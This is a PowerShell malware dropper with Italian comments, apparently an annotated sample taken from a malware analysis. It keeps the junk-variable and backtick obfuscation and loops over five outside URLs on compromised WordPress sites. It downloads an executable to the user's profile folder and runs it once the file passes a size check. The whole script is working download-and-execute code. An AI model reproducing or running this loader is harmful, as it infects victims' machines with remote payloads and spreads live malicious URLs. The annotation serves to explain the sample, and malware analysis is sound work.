# --- Variabili spazzatura per offuscamento ---
$TAnupsuy='Kllmirkgacc';
$Httefemrkyapw = '637'; # Usato per il nome del file
$Tbhxnsphmbfj='Ufmunoutbech';

# 1. Definisce il percorso e il nome del file da scaricare
# Percorso: C:\Users\<username>\637.exe
$Oyilseecfxzcn = $env:userprofile + '\' + $Httefemrkyapw + '.exe';

# --- Altra variabile spazzatura ---
$Wnbbgtanl='Nbdzjhzbsl';

# 2. Crea un oggetto WebClient per scaricare file da internet
# Il comando 'new-object' è offuscato tramite concatenazione di stringhe
$Kdszusdbssx = .('new'+'-objec'+'t') net.WeBclienT;

# 3. Definisce una lista di URL da cui tentare il download.
# Gli URL sono separati da '*' e splittati in un array.
# Questa è una tecnica di ridondanza: se un server è offline, prova il successivo.
$Zacfltdrckzu = 'https://laclinika.com/wp-admin/r42ar70/*https://thechasermart.com/wp-admin/7u93/*https://zamusicport.com/wp-content/Vmc/*https://zaloshop.net/wp-admin/8j0827/*https://www.leatherbyd.com/PHPMailer-master/q91l5u01353/'.Split('*');

# --- Altra variabile spazzatura ---
$Hdvzaacvgcg='Adcwrhtpjzmqu';

# 4. Inizia un ciclo per provare a scaricare il file da ogni URL
foreach($Qkiuxryjwko in $Zacfltdrckzu)
{
    try
    {
        # 5. Scarica il file (il metodo "DownloadFile" è offuscato con backticks e maiuscole/minuscole)
        $Kdszusdbssx."dOwNLOaD`F`iLe"($Qkiuxryjwko, $Oyilseecfxzcn);

        # 6. Controlla se il file scaricato ha una dimensione minima (23512 byte)
        # Questo serve a verificare che il download sia andato a buon fine.
        If ((Get-Item $Oyilseecfxzcn).Length -ge 23512) 
        {
            # 7. Se il file è valido, lo esegue.
            # Il metodo 'Start' è offuscato.
            [Diagnostics.Process]::"St`aRt"($Oyilseecfxzcn);
            
            # Esce dal ciclo dopo il primo download/esecuzione riuscito
            break;
        }
    }
    catch
    {
        # Se c'è un errore (es. URL non raggiungibile), non fa nulla e passa al successivo
    }
}
# --- Altra variabile spazzatura ---
$Dbjjrmunqkmbm='Isidmkqswrgey'